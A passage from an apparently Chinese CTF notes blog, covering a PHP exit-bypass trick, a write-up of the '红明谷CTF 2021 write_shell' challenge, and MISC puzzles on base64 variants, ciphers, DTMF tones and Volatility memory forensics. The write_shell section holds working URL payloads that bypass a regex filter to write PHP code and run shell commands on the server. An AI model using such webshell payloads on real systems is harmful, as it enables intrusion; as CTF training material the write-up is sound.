class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的filename可以设置为php伪协议，用write的方式写入文件。然后使用string.rot13编码或者base64decode都行，应该都是可以绕过这个死亡退出的。但是如果前面的filename使用的是rot13进行编码的话，必须要把php的短标签给禁用掉，因为rot13编码里面，符号并不会进行编码，那这个里面的内容还会解析，就会报错应该是。</p><h4 id="md5のtrick"><a href="#md5のtrick" class="headerlink" title="md5のtrick"></a>md5のtrick</h4><p><a href="https://jaimelightfoot.com/blog/b00t2root-ctf-easyphp/">b00t2root CTF: EasyPhp</a></p><p>遇到再总结。</p><h3 id="PHP题目"><a href="#PHP题目" class="headerlink" title="PHP题目"></a>PHP题目</h3><h4 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里重要的就是<code> file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</code>这个点了啊，将传入的数据<code>data</code>写入<code>index.php</code>这个文件，然后上面又给了这个文件所在的目录，所以这里可以直接先<code>pwd</code>获得这个目录，打开一个标签页，然后再使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?action=upload&amp;data=&lt;?echo(`ls\t/`)?&gt;</span><br><span class="line"></span><br><span class="line">bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure><p>获得flag的文件名再cat一下就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?action=upload&amp;data=&lt;?echo(`cat\t/flllllll1112222222lag`)?&gt;</span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="编码与密码"><a href="#编码与密码" class="headerlink" title="编码与密码"></a>编码与密码</h2><h3 id="base64换表脚本"><a href="#base64换表脚本" class="headerlink" title="base64换表脚本"></a>base64换表脚本</h3><blockquote><p>换表base64</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span></span><br><span class="line"></span><br><span class="line">string1 = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure><blockquote><p>str1是要解密的代码、string1是改过之后的base64表</p></blockquote><h3 id="base家族套娃解密"><a href="#base家族套娃解密" class="headerlink" title="base家族套娃解密"></a>base家族套娃解密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debase</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># base85</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            temp = base64.b85decode(content.encode())</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(temp):</span><br><span class="line">                content = <span class="built_in">str</span>(temp)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># base64</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            temp = base64.b64decode(content.encode())</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(temp):</span><br><span class="line">                content = <span class="built_in">str</span>(temp)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># base32</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            temp = base64.b32decode(content.encode())</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(temp):</span><br><span class="line">                content = <span class="built_in">str</span>(temp)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># base16</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            temp = base64.b16decode(content.encode())</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(temp):</span><br><span class="line">                content = <span class="built_in">str</span>(temp)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 下面是循环打破的条件，一般情况下解密成功后前两位的字符应该是b&#x27;</span></span><br><span class="line">        content = <span class="built_in">str</span>(content)</span><br><span class="line">        <span class="keyword">if</span> content[:<span class="number">2</span>] == <span class="string">&quot;b&#x27;&quot;</span>:</span><br><span class="line">            content = content[<span class="number">2</span>:<span class="built_in">len</span>(content) - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> content == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;啥都没有&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;——————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">        debase(data)</span><br><span class="line">        <span class="comment"># XZITCTF&#123;ba3e64_base32_BaSE16&#125;</span></span><br></pre></td></tr></table></figure><h3 id="一些特殊编码的题目"><a href="#一些特殊编码的题目" class="headerlink" title="一些特殊编码的题目"></a>一些特殊编码的题目</h3><h4 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h4><p>给出的附件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line">50pt</span><br><span class="line"></span><br><span class="line">(╯°□°）╯︵ ┻━┻</span><br><span class="line"></span><br><span class="line">d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</span><br></pre></td></tr></table></figure><p>可以看到给出的有效的条件的内容仅为一堆十六进制的字符串，这个时候考虑下面的编码方式。</p><p>两位十六进制转十进制<code>-128</code>再转ASCII。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="string">&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd &#x27;</span></span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s) - <span class="number">2</span>, <span class="number">2</span>):</span><br><span class="line">    t.append(s[i: i +<span class="number">2</span>])</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">    temp = <span class="built_in">int</span>(<span class="string">&#x27;0x &#x27;</span> +i, <span class="number">16</span>) - <span class="number">128</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(temp)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span></span><br></pre></td></tr></table></figure><h4 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h4><p><strong>logo编码、特殊编码、画图</strong></p><p>给出题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home</span><br></pre></td></tr></table></figure><p>复制前面的一部分谷歌一下发现<a href="https://personal.utdallas.edu/~veerasam/logo/">解释</a></p><p>还有在线的代码运行的<a href="https://www.calormen.com/jslogo/">网站</a></p><p>直接粘贴进去运行一下即可。</p><p><img src="/2021/05/28/CTF//image-20210827223320692.png"></p><h3 id="手机按键音"><a href="#手机按键音" class="headerlink" title="手机按键音"></a>手机按键音</h3><h4 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h4><p><a href="http://dialabc.com/sound/detect/index.html">在线网站</a></p><p>DTMF拨号音识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">999 * 666 * 88 * 2 * 777 * 33 * 6 * 99 * 4 * 444 * 777 * 555 * 333 * 777</span><br></pre></td></tr></table></figure><p>按九宫格解一下码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are my girlfriend</span><br></pre></td></tr></table></figure><p>在线网站识别的总是少一段，虽然最后我们推测也是可以推测出来的，但是还是有拨号音识别的相关的专用的工具以供下载的</p><p><a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">拨号音识别工具</a></p><p><a href="http://freshmeat.sourceforge.net/projects/dtmf2num">dtmf2num官方网址</a></p><p><img src="/2021/05/28/CTF//image-20210701205601479.png" alt="image-20210701205601479"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777</span><br><span class="line">youaremygirlfriends</span><br></pre></td></tr></table></figure><p><code>flag&#123;youaremygirlfriends&#125;</code></p><h3 id="W型栅栏密码"><a href="#W型栅栏密码" class="headerlink" title="W型栅栏密码"></a>W型栅栏密码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">若知道栏数，则使用decode解密，若不知道，则使用crack_cipher遍历所有可能性</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_w</span>(<span class="params">string, n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;将字符排列成w型&#x27;&#x27;&#x27;</span></span><br><span class="line">    array = [[<span class="string">&#x27;.&#x27;</span>]*<span class="built_in">len</span>(string) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="comment">#生成初始矩阵</span></span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    upflag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)): <span class="comment">#在矩阵上按w型画出string</span></span><br><span class="line">        array[row][col] = string[col]</span><br><span class="line">        <span class="keyword">if</span> row == n-<span class="number">1</span>:</span><br><span class="line">            upflag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> row == <span class="number">0</span>:</span><br><span class="line">            upflag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> upflag:</span><br><span class="line">            row -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            row += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">string, n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;加密&#x27;&#x27;&#x27;</span></span><br><span class="line">    array = generate_w(string, n)</span><br><span class="line">    msg = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">#将每行的字符连起来</span></span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">            <span class="keyword">if</span> array[row][col] != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                msg.append(array[row][col])</span><br><span class="line">    <span class="keyword">return</span> array, msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">string, n</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;解密&#x27;&#x27;&#x27;</span></span><br><span class="line">    array = generate_w(string, n)</span><br><span class="line">    sub = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">#将w型字符按行的顺序依次替换为string</span></span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)):</span><br><span class="line">            <span class="keyword">if</span> array[row][col] != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                array[row][col] = string[sub]</span><br><span class="line">                sub += <span class="number">1</span></span><br><span class="line">    msg = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string)): <span class="comment">#以列的顺序依次连接各字符</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> array[row][col] != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                msg.append(array[row][col])</span><br><span class="line">    <span class="keyword">return</span> array, msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_cipher</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;破解密码&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">len</span>(string)): <span class="comment">#遍历所有可能的栏数</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(n)+<span class="string">&#x27;栏：&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(decode(string, n)[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    string =<span class="string">&#x27;=h3kllh0YNYIYJMFMBZxXmjzTTjzGmT3mNINEOgYgZVZsZx3z5j1&#x27;</span></span><br><span class="line">    n = <span class="number">5</span> <span class="comment">#栏数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#若不知道栏数，则遍历所有可能</span></span><br><span class="line">    <span class="comment"># crack_cipher(string)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#若知道栏数</span></span><br><span class="line">    array,msg = decode(string, n)</span><br><span class="line">    <span class="comment"># array,msg = encode(string, n)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> array: <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(msg)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(flag[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><h4 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h4><p>这道题目中的栅栏密码应该说是有点特殊的，要在<a href="http://ctf.ssleye.com/railfence.html">在线詹栅栏密码</a>这个网站上进行key为7的加密才能得到正确的内容<code>kzna&#123;blnl_abj_lbh_trg_vg&#125;</code>，然后在进行凯撒密码</p><p><img src="/2021/05/28/CTF//image-20210804191048553.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xman&#123;oyay_now_you_get_it&#125;</span><br></pre></td></tr></table></figure><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="工具安装与使用"><a href="#工具安装与使用" class="headerlink" title="工具安装与使用"></a>工具安装与使用</h3><h4 id="volatility安装使用"><a href="#volatility安装使用" class="headerlink" title="volatility安装使用"></a>volatility安装使用</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><a href="https://github.com/volatilityfoundation/volatility">GitHub该项目地址</a>，点击右边的Release带版本的最新的版本，也是18年的。。。</p><p><img src="/2021/05/28/CTF//image-20210809165342125.png"></p><p>这个volatility对应的是python2，而且如果是在ubuntu中环境也不好配置。</p><p><a href="https://www.volatilityfoundation.org/26">官网地址</a>，也是最新的2.6的版本，然后直接下载下面图片中的这个文件即可，将文件解压后拉到kali中之后直接就能用了。</p><p><img src="/2021/05/28/CTF//image-20210809170151856.png"></p><p>然后为了在其他文件夹时也可以使用这个内存分析工具，这里需要将这个目录添加到系统环境变量之中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 通过修改profile文件:</span><br><span class="line">vim /etc/profile</span><br><span class="line"># 修改为类似下面的这样</span><br><span class="line">export PATH=/home/m4xlmum/misc/volatility:$PATH</span><br></pre></td></tr></table></figure><p>重启一下后，配置即可生效。</p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p><a href="https://blog.csdn.net/qq_43431158/article/details/109462833">参考链接</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># 查看是什么系统的文件【imageinfo和kdbgscan这两个一般第一个最准确】</span><br><span class="line">volatility -f filename imageinfo</span><br><span class="line">volatility -f filename kdbgscan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看进程信息</span><br><span class="line">volatility -f filename pslist 